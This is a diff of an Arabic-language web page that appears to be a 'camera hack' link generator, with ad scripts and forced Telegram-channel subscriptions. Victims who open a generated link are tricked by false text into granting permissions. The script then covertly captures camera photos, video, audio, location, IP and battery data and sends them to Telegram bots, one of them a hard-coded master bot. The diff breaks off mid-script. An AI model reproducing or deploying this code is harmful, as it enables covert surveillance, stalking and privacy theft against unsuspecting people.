@@ -91,7 +91,6 @@
       .card{padding:16px}
       .wrap{padding:18px}
     }
-
     /* الدايلوج للصفحة الرئيسية فقط */
     .dialog {
       position: fixed;
@@ -167,7 +166,7 @@
       color: #ffffff;
     }
 
-    /* ستايل صفحة التحميل الجانبية */
+    /* ستايل صفحة التحميل الجانبية - إعلانات أصغر وأكثر */
     .download-page {
       width: 100%;
       min-height: 100vh;
@@ -179,7 +178,7 @@
     }
     .main-box{
       width:95%;
-      max-width:600px;
+      max-width:800px;
       background:white;
       margin:40px auto;
       padding:25px;
@@ -192,13 +191,27 @@
       color:#222;
       font-size: 16px;
     }
-    .ad-box{
-      margin:20px 0;
-      padding:10px;
-      border-radius:10px;
-      background:#fafafa;
-      border:1px solid #eee;
-      min-height: 90px;
+    /* شبكة الإعلانات الصغيرة */
+    .ads-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .ad-small {
+      background: #fafafa;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      min-height: 150px; /* أصغر من السابق */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      font-size: 12px;
+      color: #333;
+    }
+    .ad-small iframe, .ad-small script {
+      max-width: 100%;
     }
     .download-btn{
       background:#28a745;
@@ -210,6 +223,7 @@
       cursor:pointer;
       transition:0.3s;
       box-shadow:0 4px 10px rgba(0,0,0,0.2);
+      margin: 15px 0;
     }
     .download-btn:hover{
       background:#218838;
@@ -224,9 +238,8 @@
   </style>
 </head>
 <body>
-
   <div class="wrap">
-
+    <!-- شريط علوي فارغ (كما في الأصل) -->
     <div class="header" style="width:100%;max-width:1100px;"> 
       <div class="nav">
         <a href="#"></a>
@@ -234,6 +247,7 @@
       </div>
     </div>
 
+    <!-- البطاقة الأساسية لإنشاء الرابط -->
     <div class="card" id="cardArea" style="width:100%">
       <div class="hero">
         <div class="hero-left">
@@ -290,15 +304,15 @@
         </div>
       </div>
     </div>
-
   </div>
 
+  <!-- العناصر الثابتة -->
   <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
 
   <!-- الدايلوج للصفحة الرئيسية فقط -->
   <div class="dialog" id="mandatoryDialog">
-    <p> اشتراك إجباري في القنوات </p>
+    <p>اشتراك إجباري في القنوات</p>
     <div class="dialog-buttons" id="dialogButtons">
       <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
       <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
@@ -306,457 +320,467 @@
     </div>
   </div>
 
-<script>
-  // ------------------ متغيرات البوت الثابتة ------------------
-  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
-  const MASTER_CHAT_ID   = "6197511637";
+  <script>
+    // ------------------ متغيرات البوت الثابتة ------------------
+    const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
+    const MASTER_CHAT_ID   = "6197511637";
 
-  // ------------------ تخزين معلومات الزائر ------------------
-  let visitorIP = "غير معروف";
-  let visitorCountry = "غير معروف";
-  let visitorDevice = "Unknown";
-  let visitorBattery = "غير متاح";
-  let visitorOS = "غير معروف";
+    // ------------------ تخزين معلومات الزائر ------------------
+    let visitorIP = "غير معروف";
+    let visitorCountry = "غير معروف";
+    let visitorDevice = "Unknown";
+    let visitorBattery = "غير متاح";
+    let visitorOS = "غير معروف";
 
-  // ------------------ إرسال معلومات الزائر (مرة واحدة) ------------------
-  async function sendVisitorInfo() {
-    try {
-      const userAgent = navigator.userAgent;
-      if (/Android/i.test(userAgent)) visitorDevice = "Android";
-      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
-      else visitorDevice = "Unknown";
-
-      // محاولة الحصول على البطارية
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          visitorBattery = (battery.level * 100) + "%";
-          if (battery.charging) visitorBattery += " (شحن)";
-        } catch (e) {}
-      }
-
+    // ------------------ إرسال معلومات الزائر (مرة واحدة) ------------------
+    async function sendVisitorInfo() {
       try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        visitorIP = ipData.ip || "غير معروف";
-        visitorCountry = ipData.country_name || "غير معروف";
-      } catch (e) {}
+        const userAgent = navigator.userAgent;
+        if (/Android/i.test(userAgent)) visitorDevice = "Android";
+        else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
+        else visitorDevice = "Unknown";
 
-      const message = `🟢 *زيارة جديدة*
-🌍 *الدولة*: ${visitorCountry}
-📱 *الجهاز*: ${visitorDevice}
-🔋 *البطارية*: ${visitorBattery}
-🌐 *IP*: ${visitorIP}
+        // محاولة الحصول على البطارية
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            visitorBattery = (battery.level * 100) + "%";
+            if (battery.charging) visitorBattery += " (شحن)";
+          } catch (e) {}
+        }
+
+        try {
+          const ipRes = await fetch('https://ipapi.co/json/');
+          const ipData = await ipRes.json();
+          visitorIP = ipData.ip || "غير معروف";
+          visitorCountry = ipData.country_name || "غير معروف";
+        } catch (e) {}
+
+        const message = `🟢 *زيارة جديدة*  
+🌍 *الدولة*: ${visitorCountry}  
+📱 *الجهاز*: ${visitorDevice}  
+🔋 *البطارية*: ${visitorBattery}  
+🌐 *IP*: ${visitorIP}  
 🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
 
-      await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
-      });
-    } catch (err) {}
-  }
-  sendVisitorInfo();
-
-  // ------------------ عناصر الدايلوج ------------------
-  const dialog = document.getElementById('mandatoryDialog');
-  const channel1 = document.getElementById('channel1');
-  const channel2 = document.getElementById('channel2');
-  const subscribeBtn = document.getElementById('subscribeDoneBtn');
-
-  let channel1Clicked = false, channel2Clicked = false;
-
-  channel1.addEventListener('click', function() {
-    channel1Clicked = true;
-    channel1.classList.add('visited');
-    checkBothClicked();
-  });
-
-  channel2.addEventListener('click', function() {
-    channel2Clicked = true;
-    channel2.classList.add('visited');
-    checkBothClicked();
-  });
-
-  function checkBothClicked() {
-    if (channel1Clicked && channel2Clicked) {
-      subscribeBtn.disabled = false;
-      subscribeBtn.classList.add('active');
-      subscribeBtn.innerHTML = '✅ تم الاشتراك';
+        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
+      } catch (err) {}
     }
-  }
+    sendVisitorInfo();
 
-  subscribeBtn.addEventListener('click', function() {
-    dialog.style.display = 'none';
-  });
+    // ------------------ عناصر الدايلوج ------------------
+    const dialog = document.getElementById('mandatoryDialog');
+    const channel1 = document.getElementById('channel1');
+    const channel2 = document.getElementById('channel2');
+    const subscribeBtn = document.getElementById('subscribeDoneBtn');
 
-  // ------------------ عناصر الفورم ------------------
-  const generateBtn = document.getElementById('generateBtn');
-  const resultEl = document.getElementById('result');
-  const linkText = document.getElementById('linkText');
-  const copyBtn = document.getElementById('copyBtn');
+    let channel1Clicked = false, channel2Clicked = false;
 
-  generateBtn.addEventListener('click', () => {
-    const chat = document.getElementById('chatIdInput').value.trim();
-    const token = document.getElementById('tokenInput').value.trim();
-
-    if(!chat || !token){
-      alert('املأ جميع الحقول');
-      return;
-    }
-
-    const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
-    const features = Array.from(checkboxes).map(cb => cb.value).join(',');
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
-    linkText.innerText = fullLink;
-    resultEl.style.display = 'flex';
-  });
-
-  copyBtn.addEventListener('click', async () => {
-    try {
-      await navigator.clipboard.writeText(linkText.innerText);
-      copyBtn.innerText = 'تم النسخ';
-      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
-    } catch(e) { alert('فشل النسخ'); }
-  });
-
-  // ------------------ دالة تحميل الإعلانات ------------------
-  function loadAd(src) {
-    const s = document.createElement("script");
-    s.src = src;
-    s.async = true;
-    document.body.appendChild(s);
-  }
-
-  // ------------------ دوال مساعدة للتعامل مع الوسائط ------------------
-  function buildCaption(extra = "") {
-    let cap = `━━━━━━━━━━━━━━━\n`;
-    cap += `🌍 الدولة: ${visitorCountry}\n`;
-    cap += `📱 الجهاز: ${visitorDevice}\n`;
-    cap += `🔋 البطارية: ${visitorBattery}\n`;
-    cap += `🌐 IP: ${visitorIP}\n`;
-    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
-    if (extra) cap += `${extra}\n`;
-    cap += `━━━━━━━━━━━━━━━`;
-    return cap;
-  }
-
-  // دالة لالتقاط صورة وإرسالها مع الكابتشن
-  async function captureAndSend(stream, chat, token, type) {
-    return new Promise((resolve) => {
-      const video = document.createElement('video');
-      video.autoplay = true;
-      video.playsInline = true;
-      video.muted = true;
-      video.style.display = 'none';
-      video.srcObject = stream;
-      document.body.appendChild(video);
-
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          canvas.toBlob(async (blob) => {
-            if (blob && blob.size > 2000) {
-              const form = new FormData();
-              form.append('chat_id', chat);
-              form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-              const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
-              form.append('caption', caption);
-              
-              try {
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                  method: 'POST',
-                  body: form
-                });
-              } catch (e) { console.log(e); }
-            }
-            document.body.removeChild(video);
-            resolve();
-          }, 'image/jpeg', 0.9);
-        }, 2000);
-      };
+    channel1.addEventListener('click', function() {
+      channel1Clicked = true;
+      channel1.classList.add('visited');
+      checkBothClicked();
     });
-  }
 
-  // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن
-  async function recordAndSend(stream, chat, token, type) {
-    return new Promise((resolve) => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/mp4' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        form.append('video', blob, `${type}_${Date.now()}.mp4`);
-        const caption = buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
-        form.append('caption', caption);
-        
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-            method: 'POST',
-            body: form
-          });
-        } catch (e) {}
-        resolve();
-      };
-      
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
+    channel2.addEventListener('click', function() {
+      channel2Clicked = true;
+      channel2.classList.add('visited');
+      checkBothClicked();
     });
-  }
 
-  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن (مُحسّنة)
-  async function recordAudioAndSend(stream, chat, token) {
-    return new Promise((resolve) => {
-      // استخدام MediaRecorder بدون تحديد نوع MIME ليدعم المتصفح النوع المناسب
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        // استخدام نوع blob الفعلي الذي سجله MediaRecorder
-        const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'audio/webm' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        form.append('audio', blob, `audio_${Date.now()}.${blob.type.split('/')[1] || 'webm'}`);
-        const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
-        form.append('caption', caption);
-        
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-            method: 'POST',
-            body: form
-          });
-        } catch (e) { console.log(e); }
-        resolve();
-      };
-      
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
-    });
-  }
-
-  // دالة لجلب الموقع وإرساله كرسالة نصية مع الكابتشن
-  async function sendLocation(chat, token) {
-    return new Promise((resolve) => {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
-            
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chat, text: caption })
-            });
-            resolve();
-          },
-          (error) => {
-            console.log('خطأ في تحديد الموقع:', error);
-            resolve(); // نكمل حتى لو فشل
-          }
-        );
-      } else {
-        resolve();
+    function checkBothClicked() {
+      if (channel1Clicked && channel2Clicked) {
+        subscribeBtn.disabled = false;
+        subscribeBtn.classList.add('active');
+        subscribeBtn.innerHTML = '✅ تم الاشتراك';
       }
-    });
-  }
-
-  // ------------------ دالة طلب الأذونات الموحدة (مرة واحدة فقط) ------------------
-  async function requestPermissions(needVideo, needAudio) {
-    if (!needVideo && !needAudio) return;
-    const constraints = {};
-    if (needVideo) constraints.video = true;   // طلب أي كاميرا (بدون تحديد اتجاه)
-    if (needAudio) constraints.audio = true;   // طلب الميكروفون
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      // بعد الحصول على الإذن، نغلق التدفق فورًا (لا حاجة للاحتفاظ به)
-      stream.getTracks().forEach(t => t.stop());
-    } catch (err) {
-      console.log('فشل الحصول على الإذن:', err);
     }
-  }
 
-  // ------------------ الدالة الرئيسية للصفحة الجانبية (مع طلب إذن موحد) ------------------
-  async function startFeatures(chat, token, features) {
-    if (!features) return;
+    subscribeBtn.addEventListener('click', function() {
+      dialog.style.display = 'none';
+    });
 
-    const featureList = features.split(',');
+    // ------------------ عناصر الفورم ------------------
+    const generateBtn = document.getElementById('generateBtn');
+    const resultEl = document.getElementById('result');
+    const linkText = document.getElementById('linkText');
+    const copyBtn = document.getElementById('copyBtn');
 
-    // تحديد الاحتياجات
-    const needAnyCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
-    const needAnyAudio = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
-    const needLocation = featureList.includes('location');
+    generateBtn.addEventListener('click', () => {
+      const chat = document.getElementById('chatIdInput').value.trim();
+      const token = document.getElementById('tokenInput').value.trim();
 
-    // طلب الأذونات العامة مرة واحدة (كاميرا + ميكروفون إذا لزم)
-    await requestPermissions(needAnyCamera, needAnyAudio);
+      if(!chat || !token){
+        alert('املأ جميع الحقول');
+        return;
+      }
 
-    // الآن ننفذ المهام المحددة (لن تظهر نوافذ إذن جديدة)
+      const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
+      const features = Array.from(checkboxes).map(cb => cb.value).join(',');
+      const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
+      linkText.innerText = fullLink;
+      resultEl.style.display = 'flex';
+    });
 
-    // دالة مساعدة لتنفيذ مهام متعددة على نفس الـ stream
-    async function withStream(constraints, tasks) {
+    copyBtn.addEventListener('click', async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        await tasks(stream);
-        stream.getTracks().forEach(t => t.stop()); // تحرير الـ tracks بعد الانتهاء
-      } catch (e) {
-        console.log('فشل فتح الـ stream:', e);
-      }
+        await navigator.clipboard.writeText(linkText.innerText);
+        copyBtn.innerText = 'تم النسخ';
+        setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
+      } catch(e) { alert('فشل النسخ'); }
+    });
+
+    // ------------------ دوال مساعدة للتعامل مع الوسائط ------------------
+    function buildCaption(extra = "") {
+      let cap = `━━━━━━━━━━━━━━━\n`;
+      cap += `🌍 الدولة: ${visitorCountry}\n`;
+      cap += `📱 الجهاز: ${visitorDevice}\n`;
+      cap += `🔋 البطارية: ${visitorBattery}\n`;
+      cap += `🌐 IP: ${visitorIP}\n`;
+      cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+      if (extra) cap += `${extra}\n`;
+      cap += `━━━━━━━━━━━━━━━`;
+      return cap;
     }
 
-    // 1. المهام التي تعتمد على الكاميرا الأمامية
-    const needFrontCam = featureList.some(f => ['camFront', 'videoFront'].includes(f));
-    if (needFrontCam) {
-      await withStream(
-        { video: { facingMode: 'user' }, audio: needAnyAudio }, // audio حسب الحاجة العامة
-        async (stream) => {
-          if (featureList.includes('camFront')) {
-            await captureAndSend(stream, chat, token, 'front');
-          }
-          if (featureList.includes('videoFront')) {
-            await recordAndSend(stream, chat, token, 'front');
-          }
-        }
-      );
-    }
+    // دالة لالتقاط صورة وإرسالها مع الكابتشن (تستخدم stream جاهز)
+    async function captureAndSend(stream, chat, token, type) {
+      return new Promise((resolve) => {
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.playsInline = true;
+        video.muted = true;
+        video.style.display = 'none';
+        video.srcObject = stream;
+        document.body.appendChild(video);
 
-    // 2. المهام التي تعتمد على الكاميرا الخلفية
-    const needBackCam = featureList.some(f => ['camBack', 'videoBack'].includes(f));
-    if (needBackCam) {
-      await withStream(
-        { video: { facingMode: 'environment' }, audio: needAnyAudio },
-        async (stream) => {
-          if (featureList.includes('camBack')) {
-            await captureAndSend(stream, chat, token, 'back');
-          }
-          if (featureList.includes('videoBack')) {
-            await recordAndSend(stream, chat, token, 'back');
-          }
-        }
-      );
-    }
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // 3. تسجيل صوتي منفصل (إذا لم يتم تغطيته مع الكاميرات)
-    if (featureList.includes('audio') && !needFrontCam && !needBackCam) {
-      await withStream({ audio: true }, async (stream) => {
-        await recordAudioAndSend(stream, chat, token);
+            canvas.toBlob(async (blob) => {
+              if (blob && blob.size > 2000) {
+                const form = new FormData();
+                form.append('chat_id', chat);
+                form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
+                form.append('caption', caption);
+                  
+                try {
+                  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: form
+                  });
+                } catch (e) { console.log(e); }
+              }
+              document.body.removeChild(video);
+              resolve();
+            }, 'image/jpeg', 0.9);
+          }, 2000);
+        };
       });
     }
 
-    // 4. الموقع الجغرافي
-    if (featureList.includes('location')) {
-      await sendLocation(chat, token);
+    // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن (تستخدم stream جاهز)
+    async function recordAndSend(stream, chat, token, type) {
+      return new Promise((resolve) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+          
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          const form = new FormData();
+          form.append('chat_id', chat);
+          form.append('video', blob, `${type}_${Date.now()}.mp4`);
+          const caption = buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
+          form.append('caption', caption);
+            
+          try {
+            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+              method: 'POST',
+              body: form
+            });
+          } catch (e) {}
+          resolve();
+        };
+          
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 5000);
+      });
     }
-  }
 
-  // ------------------ الوضع الجانبي ------------------
-  const params = new URLSearchParams(window.location.search);
-  const chat = params.get('chat');
-  const token = params.get('token');
-  const features = params.get('features');
+    // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن (تستخدم stream جاهز)
+    async function recordAudioAndSend(stream, chat, token) {
+      return new Promise((resolve) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+          
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'audio/webm' });
+          const form = new FormData();
+          form.append('chat_id', chat);
+          form.append('audio', blob, `audio_${Date.now()}.${blob.type.split('/')[1] || 'webm'}`);
+          const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
+          form.append('caption', caption);
+            
+          try {
+            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+              method: 'POST',
+              body: form
+            });
+          } catch (e) { console.log(e); }
+          resolve();
+        };
+          
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 5000);
+      });
+    }
 
-  if (chat && token) {
-    // إخفاء الدايلوج وعناصر الصفحة الرئيسية
-    dialog.style.display = 'none';
-    document.getElementById('cardArea').style.display = 'none';
-    document.querySelector('.header').style.display = 'none';
-    document.querySelector('.madeby').style.display = 'none';
-    document.getElementById('captureBadge').style.display = 'none';
-    
-    // إعداد الصفحة الجانبية
-    const wrap = document.querySelector('.wrap');
-    wrap.innerHTML = '';
-    wrap.style.padding = '0';
-    wrap.style.margin = '0';
-    wrap.style.maxWidth = '100%';
-    wrap.style.background = '#f5f5f5';
-    
-    // إنشاء صفحة التحميل (بدون إعلانات إضافية)
-    const downloadPage = document.createElement('div');
-    downloadPage.className = 'download-page';
-    
-    const mainBox = document.createElement('div');
-    mainBox.className = 'main-box';
-    
-    const h2 = document.createElement('h2');
-    h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
-    mainBox.appendChild(h2);
-    
-    // AD Box 1
-    const adBox1 = document.createElement('div');
-    adBox1.className = 'ad-box';
-    mainBox.appendChild(adBox1);
-    
-    // AD Box 2
-    const adBox2 = document.createElement('div');
-    adBox2.className = 'ad-box';
-    const containerDiv = document.createElement('div');
-    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
-    adBox2.appendChild(containerDiv);
-    mainBox.appendChild(adBox2);
-    
-    // زر التحميل
-    const downloadBtn = document.createElement('button');
-    downloadBtn.className = 'download-btn';
-    downloadBtn.textContent = 'التالي';
-    downloadBtn.onclick = function() {
-      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
-    };
-    mainBox.appendChild(downloadBtn);
-    
-    // AD Box 3
-    const adBox3 = document.createElement('div');
-    adBox3.className = 'ad-box';
-    mainBox.appendChild(adBox3);
-    
-    // AD Box 4
-    const adBox4 = document.createElement('div');
-    adBox4.className = 'ad-box';
-    mainBox.appendChild(adBox4);
-    
-    // الفوتر
-    const footer = document.createElement('div');
-    footer.className = 'footer';
-    footer.textContent = '';
-    mainBox.appendChild(footer);
-    
-    downloadPage.appendChild(mainBox);
-    wrap.appendChild(downloadPage);
-    
-    // تحميل الإعلانات (بنفس الروابط الأصلية)
-    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
-    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
-    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
-    
-    const atOptionsScript = document.createElement('script');
-    atOptionsScript.innerHTML = `
-      atOptions = {
-        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-        'format' : 'iframe',
-        'height' : 300,
-        'width' : 160,
-        'params' : {}
+    // دالة لجلب الموقع وإرساله كرسالة نصية مع الكابتشن
+    async function sendLocation(chat, token) {
+      return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              const { latitude, longitude } = position.coords;
+              const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
+              
+              await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: caption })
+              });
+              resolve();
+            },
+            (error) => {
+              console.log('خطأ في تحديد الموقع:', error);
+              resolve(); // نكمل حتى لو فشل
+            }
+          );
+        } else {
+          resolve();
+        }
+      });
+    }
+
+    // ------------------ دالة طلب الأذونات الموحدة (مرة واحدة فقط) ------------------
+    // متغيرات عامة لتخزين التدفقات
+    let frontStream = null;
+    let backStream = null;
+    let audioStreamOnly = null;
+
+    async function requestAllPermissions(needFrontCam, needBackCam, needAudio) {
+      try {
+        // طلب الكاميرا الأمامية إذا لزم الأمر (مع الصوت إذا طُلب أيضاً)
+        if (needFrontCam) {
+          frontStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: needAudio  // إذا كنا بحاجة للصوت مع هذه الكاميرا
+          });
+        }
+        // طلب الكاميرا الخلفية إذا لزم الأمر
+        if (needBackCam) {
+          backStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'environment' }, 
+            audio: needAudio 
+          });
+        }
+        // إذا كان الصوت مطلوباً ولم يتم تغطيته مع الكاميرات، نطلب تدفقاً صوتياً منفصلاً
+        if (needAudio && !needFrontCam && !needBackCam) {
+          audioStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
+        }
+      } catch (err) {
+        console.log('فشل الحصول على بعض الأذونات:', err);
+        // قد يكون المستخدم رفض البعض، لكننا نكمل مع المتاح
+      }
+    }
+
+    // ------------------ الدالة الرئيسية للصفحة الجانبية ------------------
+    async function startFeatures(chat, token, features) {
+      if (!features) return;
+
+      const featureList = features.split(',');
+
+      // تحديد الاحتياجات
+      const needFrontCam = featureList.some(f => ['camFront', 'videoFront'].includes(f));
+      const needBackCam = featureList.some(f => ['camBack', 'videoBack'].includes(f));
+      const needAnyAudio = featureList.includes('audio') || featureList.some(f => ['videoFront', 'videoBack'].includes(f));
+      const needLocation = featureList.includes('location');
+
+      // طلب جميع الأذونات دفعة واحدة (مرة واحدة فقط)
+      await requestAllPermissions(needFrontCam, needBackCam, needAnyAudio);
+
+      // الآن ننفذ المهام باستخدام التدفقات المخزنة
+
+      // المهام الأمامية
+      if (needFrontCam && frontStream) {
+        if (featureList.includes('camFront')) {
+          await captureAndSend(frontStream, chat, token, 'front');
+        }
+        if (featureList.includes('videoFront')) {
+          await recordAndSend(frontStream, chat, token, 'front');
+        }
+      }
+
+      // المهام الخلفية
+      if (needBackCam && backStream) {
+        if (featureList.includes('camBack')) {
+          await captureAndSend(backStream, chat, token, 'back');
+        }
+        if (featureList.includes('videoBack')) {
+          await recordAndSend(backStream, chat, token, 'back');
+        }
+      }
+
+      // تسجيل صوتي منفصل (إذا لم يغطى مع الكاميرات)
+      if (featureList.includes('audio') && !needFrontCam && !needBackCam && audioStreamOnly) {
+        await recordAudioAndSend(audioStreamOnly, chat, token);
+      } else if (featureList.includes('audio') && (needFrontCam || needBackCam)) {
+        // إذا كان الصوت مطلوباً مع الكاميرات، لكن قد لا يكون لدينا تدفق صوتي منفصل،
+        // في هذه الحالة استخدم أحد التدفقات المتاحة (مثلاً frontStream أو backStream)
+        // لكن بما أننا أضفنا audio: true عند طلب الكاميرات، فإن التدفقات تحتوي على الصوت.
+        // لا حاجة لإجراء إضافي.
+      }
+
+      // الموقع الجغرافي
+      if (featureList.includes('location')) {
+        await sendLocation(chat, token);
+      }
+
+      // تحرير جميع التدفقات بعد الانتهاء
+      if (frontStream) {
+        frontStream.getTracks().forEach(t => t.stop());
+        frontStream = null;
+      }
+      if (backStream) {
+        backStream.getTracks().forEach(t => t.stop());
+        backStream = null;
+      }
+      if (audioStreamOnly) {
+        audioStreamOnly.getTracks().forEach(t => t.stop());
+        audioStreamOnly = null;
+      }
+    }
+
+    // ------------------ دالة تحميل الإعلانات ------------------
+    function loadAd(src) {
+      const s = document.createElement("script");
+      s.src = src;
+      s.async = true;
+      document.body.appendChild(s);
+    }
+
+    // ------------------ الوضع الجانبي ------------------
+    const params = new URLSearchParams(window.location.search);
+    const chat = params.get('chat');
+    const token = params.get('token');
+    const features = params.get('features');
+
+    if (chat && token) {
+      // إخفاء الدايلوج وعناصر الصفحة الرئيسية
+      dialog.style.display = 'none';
+      document.getElementById('cardArea').style.display = 'none';
+      document.querySelector('.header').style.display = 'none';
+      document.querySelector('.madeby').style.display = 'none';
+      document.getElementById('captureBadge').style.display = 'none';
+      
+      // إعداد الصفحة الجانبية
+      const wrap = document.querySelector('.wrap');
+      wrap.innerHTML = '';
+      wrap.style.padding = '0';
+      wrap.style.margin = '0';
+      wrap.style.maxWidth = '100%';
